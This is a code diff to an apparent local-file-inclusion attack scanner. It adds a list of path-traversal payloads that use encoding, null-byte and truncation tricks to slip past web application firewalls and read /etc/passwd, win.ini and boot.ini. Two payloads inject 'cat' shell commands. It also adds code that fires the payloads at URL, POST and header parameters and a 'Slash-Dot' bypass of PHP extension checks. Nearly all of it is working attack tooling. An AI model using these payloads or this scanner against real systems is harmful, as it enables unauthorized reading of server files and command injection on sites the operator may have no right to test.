@@ -201,7 +201,181 @@ class FileInclusionScanner:
                         if "R" in fileobj.getFlags():
                             break
 
+            # Advanced curated fuzz pass — WAF evasion, encoding bypasses
+            if not ret:
+                self.log.log("Blind scan exhausted. Trying advanced fuzz payloads...", LOG_INFO)
+                for k, v in self.params.items():
+                    fuzz_rep = await self._run_advanced_fuzz(self.params, k, v, 0, deepcopy(self.config.header))
+                    if fuzz_rep:
+                        ret.append((fuzz_rep, await self.read_files(fuzz_rep)))
+                        break
+
+                if not ret:
+                    for k, v in self.postparams.items():
+                        fuzz_rep = await self._run_advanced_fuzz(self.postparams, k, v, 1, deepcopy(self.config.header))
+                        if fuzz_rep:
+                            ret.append((fuzz_rep, await self.read_files(fuzz_rep)))
+                            break
+
+                if not ret:
+                    for key, params in self.header.items():
+                        for k, v in params.items():
+                            fuzz_rep = await self._run_advanced_fuzz(
+                                self.header, k, v, 2, deepcopy(self.config.header), key
+                            )
+                            if fuzz_rep:
+                                ret.append((fuzz_rep, await self.read_files(fuzz_rep)))
+                                break
+                        if ret:
+                            break
+
         return ret
+
+    #=== Advanced fuzz payloads ================================================
+
+    @staticmethod
+    def _get_advanced_fuzz_payloads() -> list[tuple[str, str]]:
+        """Return curated LFI traversal payloads for WAF evasion and encoding bypass.
+
+        Each tuple is ``(payload, description)``.  These are used as a final
+        fuzz pass after algorithmic blind scanning fails.
+        """
+        return [
+            # -- double encoding --------------------------------------------------
+            ("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+             "double-encoded traversal (8 levels)"),
+            ("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+             "double-encoded traversal (6 levels)"),
+
+            # -- Unicode / UTF-8 overlong (IIS, old PHP) --------------------------
+            ("/..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+             "Unicode bypass (%c0%af) — IIS"),
+            ("/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+             "UTF-8 overlong (%c0%ae) — 5 levels"),
+            ("/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+             "UTF-8 overlong (%c0%ae) — 3 levels"),
+
+            # -- mixed slashes ----------------------------------------------------
+            ("/..\\../..\\../..\\../..\\../etc/passwd",
+             "mixed slashes (/..\\../..\\)"),
+
+            # -- dot-only traversal (some WAFs miss it) ---------------------------
+            ("/././././././etc/passwd",
+             "dot-only traversal (/././././././)"),
+
+            # -- newline injection (shell-in-LFI) ---------------------------------
+            ("%0a/bin/cat%20/etc/passwd",
+             "newline injection + cat"),
+            ("%0a;cat%20/etc/passwd",
+             "newline injection + semicolon cat"),
+
+            # -- null-byte prefix / suffix tricks ---------------------------------
+            ("%00../../../../../../etc/passwd",
+             "null-byte prefix + traversal"),
+            ("/../../../../etc/passwd%00.jpg",
+             "extension masquerade (%00.jpg)"),
+            ("/../../../../etc/passwd%00.html",
+             "extension masquerade (%00.html)"),
+
+            # -- WAF evasion with XML entity / quotes ----------------------------
+            ("&apos;/bin/cat%20/etc/passwd&apos;",
+             "WAF evasion — xml-entity quote wrapping"),
+
+            # -- double / triple URL encoding -------------------------------------
+            ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+             "double URL-encoded (%252e%252e%252f)"),
+            ("..%252f..%252f..%252f..%252f..%252fetc/passwd",
+             "nested encoding (..%252f..%252f)"),
+            ("%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd",
+             "triple URL-encoded (%25252e)"),
+
+            # -- IIS / Windows backslash-unicode ----------------------------------
+            ("..%5c..%5c..%5c..%5c..%5cwindows/win.ini",
+             "Windows backslash-unicode (..%5c)"),
+            ("..%5c..%5c..%5c..%5c..%5cboot.ini",
+             "Windows backslash-unicode → boot.ini"),
+
+            # -- backslash prefix bypass ------------------------------------------
+            ("\\..\\..\\..\\..\\..\\windows\\win.ini",
+             "Windows backslash traversal"),
+
+            # -- caret / pipe injection (IIS + old CGI) ---------------------------
+            ("^^../../../../etc/passwd",
+             "caret prefix (^^) — extension stripping"),
+
+            # -- semi-colon path truncation --------------------------------------
+            ("/../../../../etc/passwd;",
+             "semicolon path truncation"),
+
+            # -- question-mark query truncation -----------------------------------
+            ("/../../../../etc/passwd?",
+             "question-mark query truncation"),
+
+            # -- hash fragment truncation -----------------------------------------
+            ("/../../../../etc/passwd%23",
+             "hash (#) fragment truncation"),
+        ]
+
+    async def _run_advanced_fuzz(
+        self,
+        params: dict,
+        k: str,
+        v: str,
+        hax_mode: int = 0,
+        header: Optional[dict] = None,
+        header_key: Optional[str] = None,
+    ) -> Optional[VulnReport]:
+        """Fire all curated fuzz payloads against a single param.
+
+        Returns a VulnReport on first hit, None if nothing worked.
+        """
+        payloads = self._get_advanced_fuzz_payloads()
+        blind_files = self.lang.getBlindFiles()
+        if not blind_files:
+            return None
+
+        # Use the first blind file's findstr as canary
+        canary = blind_files[0].getFindStr()
+
+        for payload, desc in payloads:
+            tmpurl = self.target_url
+            tmppost = self.config.p_post
+            head_dict = deepcopy(header) if header else {}
+
+            if hax_mode == 0:
+                tmpurl = tmpurl.replace("%s=%s" % (k, v), "%s=%s" % (k, payload))
+            elif hax_mode == 1:
+                tmppost = tmppost.replace("%s=%s" % (k, v), "%s=%s" % (k, payload))
+            elif hax_mode == 2:
+                tmphead = head_dict.get(header_key or "", "")
+                tmphead = tmphead.replace("%s=%s" % (k, v), "%s=%s" % (k, payload))
+                head_dict[header_key] = tmphead
+
+            async with self.semaphore:
+                if tmppost:
+                    code, _ = await self.http.post(tmpurl, tmppost, additional_headers=head_dict)
+                else:
+                    code, _ = await self.http.get(tmpurl, additional_headers=head_dict)
+
+            if code is not None and canary and canary in code:
+                self.log.log(
+                    "Advanced fuzz hit: '%s' (%s)" % (payload[:60], desc), LOG_ALWAYS
+                )
+                rep = VulnReport(self.target_url, Params=params, VulnKey=k)
+                rep.setVulnKeyVal(v)
+                rep.setPost(hax_mode)
+                rep.setPostData(self.config.p_post)
+                rep.setHeader(deepcopy(self.config.header))
+                if header_key:
+                    rep.setVulnHeaderKey(header_key)
+                rep.setSurfix("")
+                rep.setBlindDiscovered(True)
+                rep.setSuffixBreakable(False)
+                return rep
+
+            self.log.log("Advanced fuzz miss: %s" % desc, LOG_DEBUG)
+
+        return None
 
     #=== analyze_url — sniper scan ==============================================
 
@@ -544,6 +718,55 @@ class FileInclusionScanner:
                         r.setSurfix("%00")
                         r.setSuffixBreakable(True)
                         r.setSuffixBreakTechName("Null-Byte")
+
+                    # Slash-Dot Bypass — bypass substr($file,-4) != '.php' guards
+                    # /etc/passwd/. resolves to /etc/passwd at filesystem level,
+                    # but substr(-4) returns '/.' not '.php'
+                    if not r.isSuffixBreakable():
+                        self.log.log("Trying Slash-Dot Bypass to bypass extension checks...", LOG_INFO)
+                        tmpurl_sd = url
+                        post_hax_sd = post_data
+                        head_sd = deepcopy(self.config.header)
+
+                        if hax_mode == 0:
+                            tmpurl_sd = tmpurl_sd.replace(
+                                "%s=%s" % (vuln_param, params[vuln_param]),
+                                "%s=%s/." % (vuln_param, rnd_str),
+                            )
+                        elif hax_mode == 1:
+                            post_hax_sd = post_data.replace(
+                                "%s=%s" % (vuln_param, params[vuln_param]),
+                                "%s=%s/." % (vuln_param, rnd_str),
+                            )
+                        elif hax_mode == 2:
+                            tmphead_sd = deepcopy(self.config.header.get(header_key or "", ""))
+                            if isinstance(tmphead_sd, str):
+                                pv_sd = ""
+                                if isinstance(params.get(header_key), dict):
+                                    pv_sd = params[header_key].get(vuln_param, "")
+                                tmphead_sd = tmphead_sd.replace(
+                                    "%s=%s" % (vuln_param, pv_sd),
+                                    "%s=%s/." % (vuln_param, rnd_str),
+                                )
+                            head_sd[header_key or ""] = tmphead_sd
+                            r.setVulnHeaderKey(header_key)
+
+                        async with self.semaphore:
+                            if post_hax_sd:
+                                code_sd, _ = await self.http.post(tmpurl_sd, post_hax_sd, additional_headers=head_sd)
+                            else:
+                                code_sd, _ = await self.http.get(tmpurl_sd, additional_headers=head_sd)
+
+                        if code_sd is not None:
+                            # Check: random string still appears (file was included despite /. suffix)
+                            # AND the suffix with /. is NOT in the output (meaning the /. got resolved away)
+                            if code_sd.find(rnd_str) != -1 and code_sd.find("%s/." % sur) == -1:
+                                self.log.log("Slash-Dot Bypass successfull!", LOG_INFO)
+                                r.setSurfix("/.")
+                                r.setSuffixBreakable(True)
+                                r.setSuffixBreakTechName("Slash-Dot")
+                            else:
+                                self.log.log("Slash-Dot Bypass not possible.", LOG_INFO)
 
                 if sur and not r.isSuffixBreakable() and self.config.p_doDotTruncation:
                     if r.isUnix() and self.config.p_dot_trunc_only_win:
